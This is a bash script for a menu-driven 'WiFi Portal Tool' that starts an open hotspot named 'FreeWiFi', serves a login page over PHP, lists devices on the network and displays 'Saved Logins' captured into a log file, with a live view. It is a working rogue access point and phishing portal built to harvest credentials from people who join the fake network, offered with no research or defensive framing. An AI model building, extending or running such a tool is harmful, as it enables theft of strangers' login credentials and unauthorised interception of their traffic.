#!/bin/bash

PORTAL_DIR="portal"
LOG_FILE="logs/log.txt"
HOTSPOT_IFACE="wlp4s0"
INTERNET_IFACE=""  # Leave empty for hotspot-only
SSID="FreeWiFi"

# ---------------------------
# Check if create_ap is installed
# ---------------------------
check_create_ap() {
    if ! command -v create_ap >/dev/null 2>&1; then
        echo "[-] create_ap is not installed!"
        echo "Install it first: https://github.com/oblique/create_ap"
        exit 1
    fi
}

# ---------------------------
# Start open hotspot
# ---------------------------
start_hotspot() {
    if pgrep create_ap >/dev/null 2>&1; then
        echo "[!] Hotspot already running."
        return
    fi
    echo "[+] Starting open hotspot on $HOTSPOT_IFACE..."
    sudo create_ap --no-virt "$HOTSPOT_IFACE" "$INTERNET_IFACE" "$SSID" "" -B
    sleep 2
    if pgrep create_ap >/dev/null 2>&1; then
        echo "[+] Hotspot started successfully!"
    else
        echo "[-] Failed to start hotspot. Check your Wi-Fi interface and driver."
    fi
}

# ---------------------------
# Stop hotspot
# ---------------------------
stop_hotspot() {
    if pgrep create_ap >/dev/null 2>&1; then
        sudo pkill create_ap
        echo "[+] Hotspot stopped."
    else
        echo "[!] No hotspot is running."
    fi
}

# ---------------------------
# Show connected devices
# ---------------------------
show_connected_devices() {
    echo "[+] Connected devices (ARP table):"
    arp -n | grep -v "incomplete"
}

# ---------------------------
# Start login page server
# ---------------------------
start_server() {
    if [ ! -d "$PORTAL_DIR" ]; then
        echo "[-] Portal directory '$PORTAL_DIR' does not exist!"
        return
    fi
    echo "[+] Starting login page server..."
    cd "$PORTAL_DIR" || exit
    php -S 0.0.0.0:8080
}

# ---------------------------
# View saved logins
# ---------------------------
view_logs() {
    echo "---- Saved Logins ----"
    if [ -f "$LOG_FILE" ]; then
        cat "$LOG_FILE"
    else
        echo "No logs yet."
    fi
    echo "----------------------"
}

# ---------------------------
# Live logs
# ---------------------------
live_logs() {
    echo "[+] Live log view (Ctrl+C to exit)"
    [ ! -f "$LOG_FILE" ] && touch "$LOG_FILE"
    tail -f "$LOG_FILE"
}

# ---------------------------
# Edit login page
# ---------------------------
edit_page() {
    if [ ! -f "$PORTAL_DIR/index.html" ]; then
        echo "[-] Login page does not exist!"
        return
    fi
    nano "$PORTAL_DIR/index.html"
}

# ---------------------------
# Setup folders/files
# ---------------------------
setup() {
    echo "[+] Setting up folders..."
    mkdir -p "$PORTAL_DIR" logs
    touch "$LOG_FILE"
    chmod 666 "$LOG_FILE"
    echo "[+] Setup complete!"
}

# ---------------------------
# Main Menu
# ---------------------------
check_create_ap

while true; do
    echo ""
    echo "====== WiFi Portal Tool ======"
    echo "1) Setup (first time)"
    echo "2) Start Open Hotspot"
    echo "3) Stop Hotspot"
    echo "4) Show Connected Devices"
    echo "5) Start Login Page Server"
    echo "6) View Saved Logins"
    echo "7) Live View Logs"
    echo "8) Edit Login Page"
    echo "9) Exit"
    echo "=============================="
    read -p "Select option: " choice

    case $choice in
        1) setup ;;
        2) start_hotspot ;;
        3) stop_hotspot ;;
        4) show_connected_devices ;;
        5) start_server ;;
        6) view_logs ;;
        7) live_logs ;;
        8) edit_page ;;
        9) echo "Exiting..."; exit ;;
        *) echo "Invalid option" ;;
    esac
done
